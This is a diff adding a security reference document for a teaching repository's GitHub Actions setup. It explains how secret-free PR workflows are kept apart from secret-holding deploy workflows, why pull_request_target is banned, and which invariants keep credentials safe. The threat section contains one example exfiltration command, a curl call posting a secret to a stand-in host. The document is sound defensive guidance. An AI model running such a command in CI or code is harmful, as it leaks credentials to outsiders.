@@ -1,0 +1,74 @@
+# CI / GitHub Actions security
+
+Deep reference for how CI keeps secrets safe from untrusted pull requests. The
+always-on invariants are summarized in `AGENTS.md`; this file has the full
+mechanics. Read it before touching `.github/workflows/`, adding a secret to a
+workflow, or wiring real infra (Azure SQL / SCCH) into CI.
+
+## The threat
+
+This is a teaching repo (Teaching-HTL-Leonding) — **anyone can fork it and open a
+pull request**, and a PR can change *any* file CI executes: a test, a build step,
+a script. So PR code is **untrusted code that runs on our runners**. If a workflow
+exposes a secret (an LLM API key, a database credential, the deploy webhook) to a
+job that runs PR code, that PR can exfiltrate it — e.g. `curl evil.com -d "$SECRET"`.
+
+The defense is simple to state: **the workflows that run untrusted PR code must
+have no secrets in their environment, and the workflows that have secrets must not
+run untrusted PR code.**
+
+## How the two workflows are split
+
+| Workflow | Trigger | Runs PR (untrusted) code? | Has secrets? |
+| --- | --- | --- | --- |
+| **`qa.yml`** | `pull_request` to `main`, `workflow_call` | **Yes** | **No** — secret-free |
+| **`docker-publish.yml`** | `push` to `main`, `workflow_dispatch` | No | Yes |
+
+- **`qa.yml`** is the per-PR quality gate (biome, typecheck, unit + component
+  tests, `next build`, hermetic Playwright e2e). It runs untrusted fork code, so it
+  is **secret-free by construction**: it references no `secrets.*`, sets
+  `permissions: contents: read`, and feeds only **test-only dummy values** in its
+  `env:` block. Those dummies exist because `auth.ts` calls `required()` for the
+  `AZURE_*` vars and `TEACHER_GROUP_ID` at module load (also during `next build`),
+  and `AUTH_SECRET` only has to *match* between the e2e helpers and the dev server
+  — e2e tests mint Auth.js session cookies directly, so no real Entra round-trip
+  happens. There is nothing real in this environment to steal.
+- **`docker-publish.yml`** holds the real secrets (`DOCKER_USERNAME` /
+  `DOCKER_PASSWORD`, `AZURE_WEBAPP_CI_CD_URL`). It triggers **only** on `push` to
+  `main` (a maintainer merge) and manual `workflow_dispatch`. A fork PR cannot
+  produce a push to `main`, so it can never reach these secrets. It reuses `qa.yml`
+  via `workflow_call` as a gate, then builds/publishes/deploys.
+
+## GitHub's built-in protections we rely on
+
+1. **Secrets are withheld from fork `pull_request` runs.** GitHub does not pass
+   repository or organization secrets to a workflow triggered by `pull_request`
+   from a fork, and the `GITHUB_TOKEN` is read-only there. This is automatic — even
+   if `qa.yml` *did* reference a secret, a fork PR run wouldn't receive it. We don't
+   rely on that alone (qa.yml references none), but it is the backstop.
+2. **`pull_request_target` is banned here.** That trigger runs in the *base* repo
+   context **with** secrets; it is only safe while it checks out the base ref. It
+   becomes a secret-leak the moment it checks out and runs PR head code. **Do not
+   introduce `pull_request_target`** in this repo.
+3. **External-contributor approval is required.** In repo/org Settings → Actions →
+   General → *Fork pull request workflows*, the setting is
+   **"Require approval for all external contributors"** — a maintainer must click
+   *Approve and run* before any workflow runs for an outside contributor. This also
+   guards runner abuse (crypto-mining, etc.) on the secret-free workflow. This is a
+   GitHub UI setting, not in the repo — keep it on.
+
+## Invariants (do not break these)
+
+- **`qa.yml` stays secret-free.** Never add a `secrets.*` reference or a real
+  credential to a workflow that runs on `pull_request`. The `env:` block is
+  dummies only.
+- **Live tests never run on a fork `pull_request`.** Tests that need real infra
+  (Azure SQL / the SCCH LLM) are tagged `@live` and excluded from the PR run via
+  `npm run test:e2e:ci` (`--grep-invert @live`). If the project ever splits that
+  tag (e.g. `@db` vs `@llm`) or wants live tests in CI, they must run only on a
+  **trusted trigger** — `push` to `main`, a `schedule`, or a reviewer-gated
+  GitHub *Environment* — never on fork PR code.
+- **Keep `permissions:` least-privilege.** `qa.yml` only reads code and runs
+  tests, so `contents: read`. Any workflow that needs more should request the
+  minimum it needs, scoped to the job.
+- **No `pull_request_target`.** See protection 2 above.
